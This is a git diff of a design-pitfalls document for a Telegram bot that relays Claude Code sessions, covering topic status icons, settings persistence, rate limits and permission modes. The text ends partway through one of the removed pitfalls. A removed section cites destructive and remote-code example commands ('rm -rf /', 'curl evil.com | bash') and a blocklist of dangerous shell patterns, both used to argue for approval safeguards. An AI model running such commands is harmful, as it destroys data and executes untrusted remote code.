@@ -1,8 +1,10 @@
-# Pitfalls Research: v3.0 UX Overhaul
+# Pitfalls Research: v4.0 Status & Settings
 
-**Domain:** Adding compact tool output, permission modes, subagent visibility, and /clear topic reuse to an existing Telegram bot bridge for Claude Code
-**Researched:** 2026-03-01
-**Confidence:** HIGH (verified against Telegram Bot API docs, Claude Code hooks reference, existing codebase analysis)
+**Domain:** Adding color-coded topic status indicators, sub-agent suppression, sticky message deduplication, and a Telegram-native settings topic to an existing Claude Code Telegram bot bridge
+**Researched:** 2026-03-02
+**Confidence:** HIGH (Telegram Bot API constraints verified against official MTProto docs and grammY docs; integration pitfalls derived from direct codebase analysis)
+
+---
 
 ## Critical Pitfalls
 
@@ -10,304 +12,220 @@ Mistakes that cause rewrites, data loss, or require architectural changes to fix
 
 ---
 
-### Pitfall 1: Telegram Inline Keyboard callback_data 64-Byte Limit Overflow
+### Pitfall 1: icon_color Cannot Be Changed After Topic Creation
 
 **What goes wrong:**
-The expand/collapse feature needs callback_data to identify which tool call to expand. If callback_data encodes too much information (tool_use_id + action + session context), it exceeds Telegram's hard 64-byte limit and the API returns `400 BUTTON_DATA_INVALID`. The current approval keyboard uses `approve:{toolUseId}` where toolUseId is a UUID (36 chars) = 44 bytes total, which fits. But adding expand/collapse with additional context (e.g., `expand:{toolUseId}:{messageId}`) can easily exceed 64 bytes.
+`editForumTopic` does not accept an `icon_color` parameter. The color is set only at `createForumTopic` time. Any implementation that tries to change topic color (green->yellow->red->gray to indicate status) by calling `editForumTopic` with `icon_color` will silently ignore the parameter or throw a type error. The Bot API endpoint and the underlying MTProto `channels.editForumTopic` only support `title` and `icon_emoji_id` as editable fields.
 
 **Why it happens:**
-Developers encode all needed state into callback_data without measuring byte length. UUIDs are 36 characters. Action prefixes add 7-10 characters. Any additional context (message IDs, page numbers, session IDs) pushes past the limit. The 64-byte limit is enforced per button, not per keyboard.
+The `ForumTopicCreated` event includes `icon_color` as a field, so developers assume it can be changed post-creation. The `editForumTopic` docs do not list `icon_color` as a parameter, but this is easily missed when reading the creation vs edit docs together. The colors are also six fixed RGB values — not arbitrary RGB — which further limits utility even if editing were possible.
 
 **How to avoid:**
-- Use a server-side lookup Map keyed by a short token (8-char random ID or incrementing counter) that maps to the full state. callback_data becomes `exp:a1b2c3d4` (12 bytes).
-- Alternatively, since tool_use_id is a UUID, use the first 8 characters of the UUID as the key (collision probability is negligible within a single session) and store the full ID in the lookup.
-- Clean up the lookup Map when sessions end to prevent memory leaks.
-- The current approval pattern (`approve:{uuid}` = 44 bytes) is safe, but permission mode buttons that need more context are not. Budget: 64 bytes minus 10-byte action prefix = 54 bytes for the identifier.
+Use `icon_custom_emoji_id` (not `icon_color`) for dynamic status. On startup, call `getForumTopicIconStickers` to get the set of allowed free-tier emoji IDs (Telegram's default topic icon emoji pack contains colored circle variants). Map the four status states (ready/busy/error/down) to specific emoji IDs from that sticker set. When status changes, call `editForumTopic` with `icon_custom_emoji_id: <emojiId>`. Cache the emoji IDs in memory — do not call `getForumTopicIconStickers` per status update.
 
 **Warning signs:**
-- `400 Bad Request` errors when sending inline keyboards
-- Buttons that work for short tool IDs but fail for longer ones
-- Tests passing with mock data but failing with real UUIDs
+- Any code that passes `icon_color` to `editForumTopic`
+- Topic icons staying the same despite status changes
+- TypeScript grammY types showing `icon_custom_emoji_id` but not `icon_color` on the edit method payload type
 
 **Phase to address:**
-Phase 1 (compact tool output with expand/collapse). Design the callback_data encoding scheme before implementing any inline keyboards for expand/collapse.
+Phase implementing color-coded topic status. Must call `getForumTopicIconStickers` before assuming any specific emoji ID is valid.
 
 ---
 
-### Pitfall 2: Expand/Collapse Content Storage Memory Leak
+### Pitfall 2: Sub-Agent Suppression Breaks the SubagentTracker State Machine
 
 **What goes wrong:**
-When a tool call is displayed in compact form with an "Expand" button, the full content (tool input, tool output, file contents) must be stored somewhere so it can be displayed when the user taps "Expand." If stored in an in-memory Map keyed by tool_use_id, the Map grows indefinitely. A session with 500 tool calls, each storing 2-10KB of content, consumes 1-5MB. Over 10 sessions without cleanup, that is 10-50MB of data that is never read again because users rarely expand old messages. Over days of continuous operation, this becomes a significant memory leak.
+The current `SubagentTracker` maintains a per-session stack of active agents (`sessionAgentStack`). If sub-agent output is suppressed by default (v4.0 feature), the naive implementation skips calling `subagentTracker.start()` and `subagentTracker.stop()` when visibility is off. The session stack then diverges from reality. The `getActiveAgent()` function — which is used to prefix tool calls from sub-agents (`[Explore] Read(file.ts)`) — returns stale or null agents after sub-agent ends. This corrupts tool attribution for the main agent chain.
 
 **Why it happens:**
-The natural implementation is `expandableContent.set(toolUseId, fullContent)` in the tool call handler, with cleanup "deferred to later." But Telegram messages persist forever, so users can theoretically tap "Expand" on a message from hours ago. Developers keep the content "just in case" instead of accepting a time/count-based eviction.
+Suppression is natural to implement as "don't post to Telegram." The easy mistake is treating suppression as "ignore the hook entirely." The SubagentTracker is also used for: (1) tool prefix labeling in `onToolUse`, (2) depth-based indentation, and (3) temporal attribution in `onPreToolUse`. Skipping tracker updates breaks all three.
 
 **How to avoid:**
-- Use an LRU cache with a maximum size (e.g., 200 entries per session) for expandable content. When the cache exceeds the limit, evict oldest entries.
-- When a user taps "Expand" on an evicted entry, show a graceful fallback: "Content no longer available. Recent tool calls only."
-- Set a TTL on entries (e.g., 30 minutes). After TTL, remove the content but leave the message with the "Expand" button disabled or replaced with "(expired)".
-- On session end, clean up ALL stored content for that session.
-- Track the Map size in the periodic summary/status to detect unexpected growth.
+Suppression must operate exclusively at the display layer. Always call `subagentTracker.start()` on SubagentStart and `subagentTracker.stop()` on SubagentStop regardless of the sub-agent visibility setting. The suppression check should wrap only the `batcher.enqueueImmediate(spawnHtml)` and `batcher.enqueueImmediate(doneHtml)` calls in the `onSubagentStart` and `onSubagentStop` callbacks. The tracker update calls remain unconditional.
 
 **Warning signs:**
-- `process.memoryUsage().heapUsed` growing linearly over time
-- Session cleanup not reducing memory to baseline
-- More entries in the content Map than recent tool calls
+- Tool calls after a sub-agent completes being incorrectly prefixed with `[AgentName]`
+- `SubagentStop for unknown agent` warnings in logs
+- `getActiveAgent()` returning a non-null agent after all sub-agents have finished
+- Main-chain tool calls appearing indented when no sub-agent is running
 
 **Phase to address:**
-Phase 1 (compact tool output). The storage strategy must be designed as part of the expand/collapse feature, not added later.
+Phase implementing sub-agent silence by default. The suppression flag must wrap only the `batcher.enqueueImmediate` calls — not the `subagentTracker` calls.
 
 ---
 
-### Pitfall 3: Message Editing Race Conditions for Expand/Collapse
+### Pitfall 3: Settings Topic Thread ID Not Persisted Across Restarts
 
 **What goes wrong:**
-When a user taps "Expand," the bot calls `editMessageText` to replace the compact view with the full view and update the button to "Collapse." But if the MessageBatcher is currently editing the same message (e.g., appending a new tool call to a batched message), two concurrent `editMessageText` calls race. One wins, the other gets `400 message is not modified` (if content matches) or silently overwrites the other edit. The user sees a corrupt message: expanded content mixed with new tool calls, or the expand/collapse silently undone.
+The settings topic is a permanent forum topic, unlike session topics which are ephemeral. If the settings topic `threadId` is not persisted, the bot will create a new settings topic on every restart. Multiple "Bot Settings" topics accumulate in the Telegram group. Settings applied via the previous topic's inline buttons are associated with the old `threadId` and cannot be retrieved. Users are confused about which topic to use.
 
 **Why it happens:**
-The existing architecture batches tool call messages (MessageBatcher combines multiple tool calls into one Telegram message). The expand/collapse feature edits individual messages via callback queries. These two editing paths are independent and can fire simultaneously. Telegram processes edits sequentially per message, but the bot does not know the current server-side state of the message after a batch edit.
+The existing `sessions.json` is optimized for ephemeral per-session data. Adding a permanent settings topic to `sessions.json` is wrong because sessions.json gets cleaned up and overwritten. Developers either forget to persist it entirely (storing `settingsTopicThreadId` only in memory), or they use the session store inappropriately.
 
 **How to avoid:**
-- Expand/collapse should operate on INDIVIDUAL messages, not batched messages. Each tool call that has expandable content gets its own Telegram message with its own inline keyboard.
-- If batching is needed for rate limit reasons, batch only compact one-liners without expand buttons. Only standalone messages (with their own message_id) get expand/collapse buttons.
-- Implement a per-message edit lock: before editing, acquire the lock for that message_id. If the lock is held, queue the edit. This prevents concurrent edits to the same message.
-- Always catch `message is not modified` errors (already done in TopicManager.editMessage) but also catch the `message_id not found` case for messages that were deleted.
-- Track the "current state" (expanded vs collapsed) per message_id in memory, and compare before editing to avoid redundant edits.
+Persist the settings topic `threadId` in a separate `data/bot-state.json` file using atomic write (temp file + rename, same pattern as `session-store.ts`). On startup: (1) read `bot-state.json`, (2) if `settingsTopicThreadId` is present, verify the topic still exists by sending a test message or using `getForumTopicIconStickers` indirectly (prefer a lightweight probe), (3) if topic is gone (group admin deleted it), recreate and update `bot-state.json`, (4) if topic does not exist in `bot-state.json`, create it on first startup and store the `threadId`. Never identify the settings topic by name — always by stored `threadId`.
 
 **Warning signs:**
-- "message is not modified" errors appearing in logs after callback queries
-- Users tapping "Expand" and seeing no change, or seeing the compact view re-appear after expand
-- Expand working on non-batched messages but failing on batched ones
+- Multiple "Bot Settings" topics appearing in the group
+- Settings reverting on every bot restart
+- Log messages creating a new settings topic despite one already existing
 
 **Phase to address:**
-Phase 1 (compact tool output). The decision about what gets batched vs standalone must be made during architecture. Messages with inline keyboards must be standalone.
+Phase implementing the settings topic. `bot-state.json` persistence infrastructure must be built first, before creating the topic itself.
 
 ---
 
-### Pitfall 4: Auto-Accept Permission Mode Security Escalation
+### Pitfall 4: Startup Gray Sweep Rate-Limiting on editForumTopic
 
 **What goes wrong:**
-"Accept All" mode auto-approves every tool call, including `Bash "rm -rf /"`, `Bash "curl evil.com | bash"`, or write operations to sensitive files like `~/.ssh/authorized_keys`. If a Claude session is compromised, prompt-injected, or simply makes a mistake, "Accept All" mode provides zero defense. Unlike Claude Code's native `--dangerously-skip-permissions` (which is a conscious CLI flag), a Telegram button tap to set "Accept All" can be accidental or poorly understood by the user.
+The v4.0 feature "set all old topics to gray on bot startup" means calling `editForumTopic` for each session in the store that has `status === 'closed'` (or all sessions if we want all non-active sessions gray). If the session store has accumulated many sessions over weeks of use, calling `editForumTopic` for 20-30 topics in a tight loop triggers undocumented Telegram flood limits. The `transformer-throttler` plugin explicitly warns: "Telegram implements unspecified and undocumented rate limits for some API calls. These undocumented limits are NOT accounted for by the throttler." The bot receives a cascade of 429 responses, startup stalls, and some topics are not updated.
 
 **Why it happens:**
-Developers implement permission modes as a simple enum that gates the approval flow. "Accept All" bypasses the entire `onPreToolUse` callback. The logic is clean and simple. But the security implications are severe because the bot operates remotely -- the user cannot see the terminal output or intervene quickly. A destructive command executes and the damage is done before the Telegram message about it arrives.
+Developers use `Promise.all()` to update all topics concurrently (fast, parallelizable). The `auto-retry` plugin handles 429s by waiting and retrying, but with 20 concurrent requests all retrying simultaneously, the retry queue grows large and startup takes many minutes.
 
 **How to avoid:**
-- **Do NOT implement a true "Accept All" mode.** Instead, implement tiered auto-accept:
-  - **Safe Only:** Auto-approve Read, Glob, Grep, WebSearch, WebFetch. All others require manual approval.
-  - **Accept Edits:** Auto-approve Safe tools plus Write, Edit, MultiEdit. Bash still requires approval.
-  - **Same Tool:** After manually approving one Bash command, auto-approve the same tool (not the same command) for the session. Still prompts for the first use.
-  - **Until Done:** Auto-approve everything for this agentic turn only. Resets after the agent stops.
-- Even in "Until Done" mode, maintain a blocklist of patterns that ALWAYS require approval: `rm -rf`, `sudo`, `chmod 777`, `curl | bash`, SSH key operations, git force push.
-- Show a persistent warning in the status message when any auto-accept mode is active.
-- Require confirmation for enabling "Until Done" mode -- the button should trigger a follow-up "Are you sure?" prompt.
-- Log all auto-approved operations to a separate audit log for post-incident review.
+Limit the startup sweep to sessions with `status === 'active'` only — not all sessions. Active sessions at this project's scale (2-3 machines, a few sessions each) number in the single digits. Use a sequential `for...of` loop with `await` between each `editForumTopic` call, not `Promise.all`. Add a minimum 300ms gap between consecutive calls. Wrap each call in try/catch so a single 429 does not abort the sweep. Accept that historical (closed) sessions are not swept — they are already gray if they were properly closed, or they can be swept lazily on next bot start.
 
 **Warning signs:**
-- Tests passing "Accept All" without testing dangerous command patterns
-- No blocklist or safety net in auto-accept logic
-- Status message not showing current permission mode
-- No audit trail for auto-approved operations
+- Bot startup taking more than 10 seconds with many sessions in the store
+- Multiple 429 errors in the startup log before "Startup complete"
+- Some topics remaining non-gray after startup sweep
 
 **Phase to address:**
-Phase 2 (permission modes). The security design must be part of the permission mode architecture. Never merge an "Accept All" without the blocklist guard.
+Phase implementing startup cleanup / boot-time status reset. Sweep logic must be sequential and scoped to active sessions only.
 
 ---
 
-### Pitfall 5: /clear Triggers Both SessionEnd and SessionStart -- Double Processing
+### Pitfall 5: editForumTopic Race Condition with Existing updateTopicDescription Calls
 
 **What goes wrong:**
-When the user runs `/clear` in Claude Code, two hook events fire in sequence: `SessionEnd` (reason: "clear") and `SessionStart` (source: "clear"). If the bot handles `SessionEnd` by closing the topic and posting a summary (the current behavior in `handleSessionEnd`), the topic gets closed. Then `SessionStart` fires and the bot tries to reuse the topic -- but it is already closed. The bot either fails to post to the closed topic, or creates a new topic (defeating the purpose of topic reuse), or crashes trying to reopen a topic it just closed.
+The existing `onToolUse` callback already calls `monitor.statusMessage.updateTopicDescription()` (which calls `editForumTopic`) on every tool call, updating the topic name to include context percentage (`🟢 proj-name | 45% ctx`). If the new color-coded status feature also calls `editForumTopic` to update the icon emoji, two separate code paths fire `editForumTopic` for the same topic in rapid succession. Telegram's undocumented limit for `editForumTopic` on the same topic is approximately 1-2 per second. Double-firing produces 429 responses.
 
 **Why it happens:**
-The existing `handleSessionEnd` code does NOT check the reason for session end. It unconditionally marks the session as "closed" and closes the Telegram topic. The `/clear` use case was not anticipated in the v1.0/v2.0 architecture, where session end always meant "done." The handler runs `sessionStore.updateStatus(sessionId, 'closed')` and then `topicManager.closeTopic(threadId, topicName)`.
-
-The critical detail: when `/clear` fires, the `SessionEnd` has `reason: "clear"`, and the subsequent `SessionStart` has `source: "clear"` and the SAME `session_id` and `cwd`. But the session ID might change -- Claude Code documentation does not guarantee session ID stability across `/clear`.
+`StatusMessage.updateTopicDescription()` has no debounce. It fires on every tool call. The color update path (status: busy/ready/error) fires on session state changes. During active tool use, both triggers overlap. The `transformer-throttler` global rate limiter does not serialize these calls per-topic.
 
 **How to avoid:**
-- Check `reason` in `handleSessionEnd`. If `reason === "clear"`, do NOT close the topic. Instead:
-  1. Post a visual separator message ("--- Session cleared ---")
-  2. Keep the session status as "active" (or a new "cleared" intermediate state)
-  3. Reset session counters (toolCallCount, filesChanged, contextPercent) but keep the same threadId
-  4. Wait for the subsequent `SessionStart` (source: "clear") to confirm the session restarted
-- Handle the `SessionStart` (source: "clear") case in `handleSessionStart`:
-  1. Match by `cwd` (same as resume detection), not by session ID
-  2. Reuse the existing topic (same threadId)
-  3. Unpin the old status message, create and pin a new one
-  4. Post a "Session cleared" notification
-- **Important timing edge case:** The `SessionEnd` and `SessionStart` hooks fire in sequence but the HTTP responses are separate requests. The bot must handle the possibility that `SessionStart` arrives before `SessionEnd` processing completes (especially if `SessionEnd` is waiting for a Telegram API call). Use a per-session state machine: `active` -> `clearing` -> `active` (not `active` -> `closed` -> `active`).
+Consolidate all `editForumTopic` calls for a given topic into a single debounced code path. Specifically: extend the existing `updateTopicDescription` method (or its caller) to also accept the new icon emoji ID. One `editForumTopic` call updates both the `name` (with color emoji prefix + project name + context %) and `icon_custom_emoji_id`. A single debounce of 3 seconds (matching the `StatusMessage.MIN_UPDATE_INTERVAL_MS`) prevents over-calling. Do not add a second independent code path for icon updates.
 
 **Warning signs:**
-- Topic being closed and immediately reopened after `/clear`
-- New topic being created after `/clear` instead of reusing existing one
-- "Failed to send message" errors in a closed topic right after `/clear`
-- Session state flickering between "active" and "closed"
+- "Failed to edit topic name" warnings appearing in logs during active tool-use phases
+- Topic name and icon getting visually out of sync
+- 429 errors keyed to the same topic in rapid succession
 
 **Phase to address:**
-Phase 3 (/clear topic reuse). This requires changes to both `handleSessionEnd` and `handleSessionStart` simultaneously. Cannot be done incrementally.
+Phase implementing color-coded topic status. Must audit all existing `editForumTopic` call sites before adding new ones. The existing call in `updateTopicDescription` is the one to extend — do not add a new parallel call.
 
 ---
 
-### Pitfall 6: Subagent Visibility Without SubagentStart/SubagentStop Hooks
+### Pitfall 6: Settings Topic Routing Conflict with Session Topic Message Handler
 
 **What goes wrong:**
-The bot is currently wired to receive only `SessionStart`, `SessionEnd`, `PostToolUse`, `PreToolUse`, and `Notification` hooks. The `SubagentStart` and `SubagentStop` hook events are NOT configured in `~/.claude/settings.json` by the `installHooks()` function. Without these hooks, the bot has zero visibility into subagent activity. Tool calls from subagents DO arrive via `PostToolUse` (they fire for all tool calls including subagent ones), but they arrive with `isSidechain: true` in the transcript -- which the bot currently filters OUT (line 117 of handlers.ts: `if (entry.isSidechain) continue`).
+The bot's text message handler (`bot.on('message:text')`) routes messages to Claude Code sessions by looking up `threadId` via `sessionStore.getByThreadId(threadId)`. If the settings topic's `threadId` is not explicitly guarded, text typed in the settings topic silently falls through to `getByThreadId` (returning `undefined`, doing nothing), and commands like `/set_verbosity verbose` are never processed. Worse: if a session topic happens to be using the same `threadId` as the settings topic — impossible in practice but the code must be explicit — the user's settings command gets sent as input to Claude Code.
 
 **Why it happens:**
-Subagent hooks (`SubagentStart`, `SubagentStop`) were added to Claude Code after the bot was originally built. The `installHooks()` utility only registers the five hook events from v1.0. The transcript backfill code explicitly skips sidechain entries. This creates a blind spot: subagent activity is invisible.
+The existing command routing was designed for session topics only. The settings topic is a new concept. Developers add settings topic handlers but forget to add the guard in the existing text/command handlers that routes away from the settings topic before falling through to session routing.
 
 **How to avoid:**
-- Add `SubagentStart` and `SubagentStop` HTTP hooks to the `installHooks()` configuration.
-- Add handler methods for SubagentStart and SubagentStop in HookHandlers.
-- For `SubagentStart`: post a compact notification to the topic: "`Agent: Explore started`" with the agent_type.
-- For `SubagentStop`: post the last_assistant_message (summary of what the subagent found/did).
-- For `PostToolUse` events from subagents: the payload itself does NOT contain `isSidechain` -- that field is only in the JSONL transcript. The HTTP hook payload does not distinguish main-chain from sidechain tool calls. You need to correlate: if a `SubagentStart` was received and the agent has not yet stopped, subsequent tool calls with the same session context may be from the subagent. BUT: the hook payload does not contain `agent_id`.
-- **Key insight:** PostToolUse hooks fire for ALL tool calls regardless of which agent (main or sub) made them. There is no field in the PostToolUse payload to distinguish. The ONLY way to correlate tool calls to subagents is via the transcript (isSidechain + agentId fields in the JSONL). This means subagent visibility must use the SubagentStart/SubagentStop hooks for lifecycle events, and the PostToolUse events remain "ambient" -- they show all tool activity without attribution.
-- Accept the limitation: full per-subagent tool call attribution is not possible via hooks alone. Display subagent lifecycle (start/stop) and let tool calls appear in the main stream.
+At startup, load `settingsTopicThreadId` from `bot-state.json` into a module-level variable accessible by all bot handlers. In the existing `bot.on('message:text')` handler and the CLI command forwarding handler, add an early return if `threadId === settingsTopicThreadId` (handle as a settings command or ignore). Register settings-specific commands with `bot.command()` and check `ctx.message.message_thread_id === settingsTopicThreadId` inside the handler before processing. The settings topic needs its own handler registered before the catch-all text handler.
 
 **Warning signs:**
-- "Full subagent visibility" feature appearing complete but actually showing zero subagent information
-- Tool calls from subagents being silently dropped because of isSidechain filtering
-- SubagentStart/SubagentStop never firing because hooks are not registered
+- Commands typed in the settings topic having no effect
+- Text typed in the settings topic causing unexpected behavior in a session
+- Settings commands working in the main group chat but not in the settings topic
 
 **Phase to address:**
-Phase 4 (subagent visibility). Must update installHooks, add SubagentStart/SubagentStop types, and add handlers before any subagent display work.
+Phase implementing the settings topic. The settings `threadId` guard must be in place in the text handler before the settings topic is surfaced to users.
 
 ---
 
 ## Moderate Pitfalls
 
-Mistakes that cause significant rework or degraded UX but are recoverable.
+Mistakes that cause significant rework or degraded UX but are recoverable without rewriting.
 
 ---
 
-### Pitfall 7: Pinning/Unpinning Race Conditions During /clear
+### Pitfall 7: Sticky Message Deduplication Fails After Bot Restart
 
 **What goes wrong:**
-The /clear topic reuse feature requires: (1) unpin the old status message, (2) create a new status message, (3) pin the new status message. If the unpin call is slow or fails, and the pin call for the new message succeeds, the topic shows two pinned messages. If the old unpin fails silently (the current TopicManager.pinMessage catches errors), the user sees stale status information pinned alongside the new status.
-
-Additionally, Telegram only allows one pinned message per topic (the last pinned one is shown prominently). If pin calls arrive out of order due to rate limiting or network latency, the wrong message ends up pinned.
+The sticky message dedup check ("skip creating new sticky if content matches existing") relies on `StatusMessage.lastSentText` which is an in-memory field. After a bot restart, `lastSentText` is reset to `''` in the new `StatusMessage` instance. The reconnect path in `index.ts` calls `initMonitoring(session)` for each active session, which creates a new `StatusMessage` and calls `statusMsg.initialize()` — which sends a new status message and pins it. This happens even if the session already had a pinned status message from before the restart. The result: two pinned messages in the topic (old stale one + new one from restart).
 
 **Why it happens:**
-The bot's `pinMessage` method is fire-and-forget with error swallowing (line 148-157 of topics.ts). There is no `unpinChatMessage` method at all in the current TopicManager. The `/clear` feature requires both operations in a specific order, and the current infrastructure does not support ordered pin management.
+The `initMonitoring()` function always calls `statusMsg.initialize()` (send + pin), regardless of whether `session.statusMessageId` is already non-zero. The design is "always create fresh on monitoring init" but the reconnect case needs "reuse existing if available."
 
 **How to avoid:**
-- Add an `unpinMessage(messageId)` method to TopicManager that calls `bot.api.unpinChatMessage(chatId, { message_id: messageId })`.
-- Add an `unpinAllTopicMessages(threadId)` method using `bot.api.unpinAllForumTopicMessages(chatId, threadId)` -- this is simpler and avoids the "which message to unpin" question.
-- Execute unpin-then-pin as a sequential pair, NOT concurrent.
-- If unpin fails, proceed with the pin anyway (the new pin will replace the old one as the prominently displayed pinned message in Telegram).
-- Store the statusMessageId in SessionInfo (already exists) and update it atomically when creating the new status message.
+In the reconnect path (the `activeSessions` loop in `index.ts`), do not call `statusMsg.initialize()` if `session.statusMessageId > 0`. Instead, initialize the `StatusMessage` instance with `messageId` pre-set and `lastSentText` initialized to a sentinel that will cause the next real update to flush. Add a `StatusMessage.reconnect(existingMessageId)` method that sets `this.messageId = existingMessageId` without sending a new message. The dedup check (comparing `lastSentText`) then only needs to work within a single process lifetime, which the existing `3-second debounce + content comparison` already handles correctly.
 
 **Warning signs:**
-- Two pinned messages visible in a topic after /clear
-- Status message showing stale context percentage after /clear
-- "Failed to unpin message" errors in logs
+- Multiple pinned messages in a topic after every bot restart
+- "Failed to pin" warnings appearing consistently at startup (Telegram pin limit per topic)
+- Topic status message showing "Starting..." instead of the previous tool/context state
 
 **Phase to address:**
-Phase 3 (/clear topic reuse). Pin management must be implemented before /clear.
+Phase implementing sticky message deduplication. Must audit the reconnect path in `index.ts` and add `StatusMessage.reconnect()`.
 
 ---
 
-### Pitfall 8: Permission Mode State Lost Across Bot Restart
+### Pitfall 8: Settings Inline Keyboard Markup Cleared on Message Edit (Telegram Desktop Bug)
 
 **What goes wrong:**
-The user sets permission mode to "Accept Edits" via a Telegram button. The mode is stored only in memory (in the SessionInfo or a separate state object). The bot restarts. On reconnect, the permission mode resets to the default, but the user does not realize it. Claude's next tool call that would have been auto-approved now prompts for approval, confusing the user. Or worse: the user set "Safe Only" mode for a risky session, the bot restarts, and the mode resets to a more permissive default.
+The settings topic displays current settings with inline keyboard buttons for changing them. When the bot edits a settings message (e.g., to reflect a changed value), the message edit call must include `reply_markup` to preserve the buttons. If `reply_markup` is omitted from `editMessageText`, Telegram Desktop clears the buttons while Telegram Mobile preserves them. This is a confirmed client-side inconsistency. The bot's `TopicManager.editMessage()` method does not forward `reply_markup` — it passes `undefined`, which removes buttons on Telegram Desktop.
 
 **Why it happens:**
-The current `permissionMode` field in SessionInfo stores the Claude Code CLI's permission mode (from the hook payload), not the bot's per-session permission override. These are two different things: the CLI's permission mode determines which tools need approval from the perspective of Claude Code, while the bot's permission mode determines how the bot handles the approval callback. The bot override (Accept Edits, Same Tool, etc.) is a separate concept that needs its own persistence.
+The `editMessage` method was designed for status message text updates, which never have inline keyboards. Developers reuse it for settings messages without noticing the missing `reply_markup` parameter. The bug is invisible on mobile testing but immediately visible to desktop users.
 
 **How to avoid:**
-- Add a `botPermissionMode` field to SessionInfo (distinct from `permissionMode` which comes from the CLI).
-- Persist it via SessionStore (already serializes to JSON on every change).
-- On bot restart, restore the `botPermissionMode` from the persisted session and resume auto-accept behavior.
-- Consider adding a visual indicator in the reconnect message: "Bot reconnected. Permission mode: Accept Edits."
-- Default `botPermissionMode` to "prompt" (manual approval) -- the safest option.
+Add a `editMessageWithKeyboard(messageId, html, keyboard)` method to `TopicManager` that explicitly passes `reply_markup` to `editMessageText`. When updating settings display, always use this method. Alternatively, instead of editing the settings message, delete and resend it — but this changes the message position in the topic and disrupts the UX. The correct fix is always passing `reply_markup` on edit.
 
 **Warning signs:**
-- Permission mode working in a session but resetting after bot restart
-- User not knowing their permission mode changed after restart
-- Tests not covering bot restart + permission mode persistence
+- Settings buttons disappearing after the first settings change on Telegram Desktop
+- Users reporting buttons visible on mobile but not on desktop
+- `editMessageText` calls in settings logic that do not include `reply_markup`
 
 **Phase to address:**
-Phase 2 (permission modes). Persistence must be part of the initial implementation, not a follow-up.
+Phase implementing the settings topic. Keyboard preservation must be in the TopicManager API before settings messages are implemented.
 
 ---
 
-### Pitfall 9: editMessageText Rate Limiting During Expand/Collapse Spam
+### Pitfall 9: Sub-Agent Suppression Configuration Not Persisted
 
 **What goes wrong:**
-A user rapidly taps "Expand" and "Collapse" on multiple tool calls. Each tap triggers an `editMessageText` call. Telegram enforces approximately 5 edits per message per minute and ~30 messages per minute per group. After 5 rapid expand/collapse toggles on the same message, all subsequent edits fail with 429. The auto-retry plugin retries after the cooldown period, but the user sees a spinning loading indicator on the button for 30+ seconds. During this time, ALL other bot API calls for this chat (including approval messages and tool call posts) are also rate-limited.
+The settings topic allows toggling sub-agent visibility (silent vs verbose). If this setting is stored only in memory, it resets to the default on every bot restart. If the default is "silent" (the v4.0 goal), then verbose mode — which a user might have specifically enabled — silently reverts. The user does not notice until they run a complex multi-agent task and wonder why sub-agent output appears (or doesn't appear).
 
 **Why it happens:**
-The auto-retry and transformer-throttler plugins handle 429s at the API level, but they do not prevent the user from triggering rapid edits. The expand/collapse toggle is a UI control that invites rapid interaction. Unlike approval buttons (which are one-shot and get removed after use), expand/collapse buttons persist and can be tapped repeatedly.
+Feature-specific settings added via inline buttons tend to be stored as module-level variables for simplicity. The `config.ts` pattern for environment variables does not handle runtime changes. Developers add the variable but forget to connect it to the persistence layer.
 
 **How to avoid:**
-- Debounce expand/collapse callbacks: after processing one callback, ignore subsequent callbacks for the same message_id for 2 seconds. Answer the callback query immediately with a "Please wait..." text, but do not call editMessageText.
-- Track the last edit timestamp per message_id. If less than 1 second has passed, skip the edit and answer the callback with a toast notification.
-- Consider using `answerCallbackQuery` with `show_alert: false` as an immediate response, and the actual message edit on a 500ms debounce. This gives the user instant feedback (loading spinner clears) while rate-limiting the edit calls.
-- The existing auto-retry plugin handles 429s, but prevention is better than recovery. Budget 3 edits per message per minute and queue any excess.
+All runtime-configurable settings (sub-agent visibility, notification levels, default verbosity) must be stored in `bot-state.json`. When a setting changes via a Telegram button tap, write `bot-state.json` atomically immediately. On startup, read `bot-state.json` and apply stored settings before registering hook handlers. The `AppConfig` type in `config.ts` should be split: `EnvConfig` (from environment variables, read-only) and `RuntimeConfig` (from `bot-state.json`, read-write). Do not mix the two.
 
 **Warning signs:**
-- 429 errors appearing in logs during expand/collapse usage
-- Approval messages delayed by rate limit cooldown periods
-- Loading spinners on buttons lasting 10+ seconds
-- Tool call posts delayed or batched more aggressively than expected
+- Settings changes via the settings topic taking effect immediately but reverting after restart
+- Settings topic showing correct values but behavior being controlled by environment variables
+- No write to `bot-state.json` triggered on settings button tap
 
 **Phase to address:**
-Phase 1 (compact tool output). The callback query handler must include debouncing from the start.
+Phase implementing sub-agent silence by default and the settings topic. `bot-state.json` runtime config layer must be designed first.
 
 ---
 
-### Pitfall 10: Subagent Transcript Path Access Failures
+### Pitfall 10: Settings Auth Not Enforced on Callback Queries
 
 **What goes wrong:**
-The `SubagentStop` hook provides `agent_transcript_path` (e.g., `~/.claude/projects/.../abc123/subagents/agent-def456.jsonl`). The bot attempts to read this file for detailed subagent activity. But: (a) the file may not exist yet (race between hook firing and file being flushed), (b) the file path uses `~` which must be expanded, (c) the file may be in a different user's home directory if Claude Code runs under a different user than the bot, (d) the file may have been compacted or truncated by Claude Code's internal cleanup.
+The settings topic inline buttons fire callback queries. The callback query handler (registered via `bot.callbackQuery(...)`) does not verify `ctx.from?.id` against an authorized user ID. Any Telegram user who can see the settings message and tap its buttons can change bot configuration. In a shared group where the bot owner has invited team members, any member can toggle sub-agent visibility, change verbosity, or reconfigure the bot.
 
 **Why it happens:**
-The `SubagentStop` hook fires when the subagent finishes, but the JSONL transcript may still be in a write buffer. Reading immediately may get a partial file. The `agent_transcript_path` is a convenience field but the file lifecycle is not guaranteed to be synchronized with hook delivery.
+The existing approval keyboard handlers (`approve:`, `deny:`, mode buttons) do not verify `ctx.from.id` either — the approval design is intentionally per-group (any trusted group member can approve a tool call). Developers carry this assumption into the settings topic without realizing settings changes are more sensitive than one-off approvals.
 
 **How to avoid:**
-- Do NOT rely on reading the subagent transcript file for the primary display. Use the `last_assistant_message` field from `SubagentStop` instead -- it is always present and contains the subagent's final summary.
-- If you need detailed subagent tool calls for an "expand" view, read the transcript with a small delay (500ms) and handle partial/missing files gracefully.
-- Expand the tilde in the path: `path.replace(/^~/, process.env.HOME || '')`.
-- Wrap all transcript reads in try/catch with a fallback to "(transcript unavailable)".
-- Parse JSONL line-by-line (already done in backfillFromTranscript), not as a single JSON blob, since partial writes produce incomplete final lines.
